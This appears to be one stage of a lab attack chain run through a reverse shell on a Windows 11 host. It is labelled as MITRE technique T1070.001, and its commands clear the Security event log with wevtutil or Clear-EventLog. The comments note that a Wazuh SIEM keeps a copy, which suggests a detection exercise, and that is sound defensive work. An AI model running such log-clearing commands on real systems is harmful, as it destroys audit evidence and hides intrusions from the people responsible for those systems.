# Stage 10 — Cleanup / Anti-Forensics (T1070.001)
# Host: Windows 11 victim, run through the reverse shell
# Clears the Security event log. Event 1102 is written BEFORE the log is
# cleared and is forwarded to Wazuh, so the SIEM copy survives.

wevtutil cl Security
# or:
# Clear-EventLog -LogName Security
